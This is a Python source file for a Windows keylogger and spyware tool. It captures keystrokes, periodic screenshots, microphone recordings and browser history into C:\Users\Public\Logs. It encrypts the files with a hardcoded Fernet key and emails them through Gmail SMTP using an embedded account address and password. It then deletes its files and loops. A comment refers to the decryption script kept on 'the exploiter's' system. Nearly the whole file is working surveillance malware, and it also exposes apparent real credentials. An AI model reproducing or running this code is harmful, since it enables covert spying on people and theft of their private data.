import os, re, smtplib, logging, pathlib, json, time, sounddevice, shutil
from psutil import users
import browserhistory as bh
from scipy.io.wavfile import write as write_rec
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

user = os.getlogin()

# Keystroke Capture Funtion #
def logg_keys(file_path):
    logging.basicConfig(filename=(file_path + "key_logs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()

# Screenshot Capture Function #
def screenshot(file_path):
    pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
    screen_path = file_path + 'Screenshots\\'

    for x in range(0,6):
        pic = ImageGrab.grab()
        pic.save(screen_path + 'screenshot{}.png'.format(x))
        time.sleep(600)

# Mic Recording Function #
def microphone(file_path):
    try:
        for x in range(0, 5):
            fs = 44100
            seconds = 60
            myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
            sounddevice.wait()
            write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)
    except:
        pass

def email_base(name, email_address):
    name['From'] = email_address
    name['To'] =  email_address
    name['Subject'] = 'Confidential Data'
    body = 'Data received'
    name.attach(MIMEText(body, 'plain'))
    return name

def smtp_handler(email_address, password, name):
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, email_address, name.as_string())
    s.quit()

# Email sending function #
def send_email(path):
    regex = re.compile(r'.+\.xml$')
    regex2 = re.compile(r'.+\.txt$')
    regex3 = re.compile(r'.+\.png$')
    regex4 = re.compile(r'.+\.jpg$')
    regex5 = re.compile(r'.+\.wav$')
    regex6 = re.compile(r'.+\.gz$')

    email_address = 'anonymouswatcher47@gmail.com'
    password = 'Shahnifamily#06'
    
    msg = MIMEMultipart()
    email_base(msg, email_address)

    exclude = set(['Screenshots', 'WebcamPics'])
    for dirpath, dirnames, filenames in os.walk(path, topdown=True):
        dirnames[:] = [d for d in dirnames if d not in exclude]
        for file in filenames:
            if regex.match(file) or regex2.match(file) \
                or regex3.match(file) or regex4.match(file):

                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 
                                'filename = {}'.format(file))
                msg.attach(p)

            elif regex5.match(file):
                msg_alt = MIMEMultipart()
                email_base(msg_alt, email_address)
                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 
                                'filename = {}'.format(file))
                msg_alt.attach(p)

                smtp_handler(email_address, password, msg_alt)

            elif regex6.match(file):
                msg_alt = MIMEMultipart()
                email_base(msg_alt, email_address)
                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 
                                'filename = {}'.format(file))
                msg_alt.attach(p)

                smtp_handler(email_address, password, msg_alt)

            else:
                pass

    smtp_handler(email_address, password, msg)

def main():
    pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
    file_path = 'C:\\Users\\Public\\Logs\\'

    ##### Get the browsing history ##################################################################################################
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((bh_user, db_path, hist))
    with open(file_path + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(browser_history))

    ##### Using multiprocess module to log keystrokes, get screenshots, ############################################################ 
    # record microphone, as well as webcam picures #
    p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()
    p2 = Process(target=screenshot, args=(file_path,)) ; p2.start()
    p3 = Process(target=microphone, args=(file_path,)) ; p3.start()

    p1.join(timeout=3600)
    p2.join(timeout=3600)
    p3.join(timeout=3600)

    p1.terminate()
    p2.terminate()
    p3.terminate()

    ##### Encrypt files #############################################################################################################
    files = ['browser.txt', 'key_logs.txt']

    regex = re.compile(r'.+\.xml$')
    dir_path = 'C:\\Users\\Public\\Logs'

    for dirpath, dirnames, filenames in os.walk(dir_path):
        [ files.append(file) for file in filenames if regex.match(file) ]

    # In the python console type: from cryptography.fernet import Fernet ; then run the command
    # below to generate a key. This key needs to be added to the key variable below as
    # well as in the DecryptFile.py that should be kept on the exploiters system. If either
    # is forgotten either encrypting or decrypting process will fail. #
    # Command -> Fernet.generate_key()
    key = b'hj4alv2FTqBONIcuJleQISmWpyhMMu72zQ11EMItaLM='

    for file in files:
        with open(file_path + file, 'rb') as plain_text:
            data = plain_text.read()
        encrypted = Fernet(key).encrypt(data)
        with open(file_path + 'e_' + file, 'ab') as hidden_data:
            hidden_data.write(encrypted)
        if file ==  'key_logs.txt':
            p1.terminate()
            p1.join()
        os.remove(file_path + file)

    ##### Send encrypted files to email account #####################################################################################
    try:
        send_email('C:\\Users\\Public\\Logs')
        send_email('C:\\Users\\Public\\Logs\\Screenshots')
    except:
        pass

    # Clean Up Files #
    shutil.rmtree('C:\\Users\\Public\\Logs')

    # Loop #
    main()


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        1 == 1

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, \
                            filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception('* Error Ocurred: {} *'.format(ex))
        pass
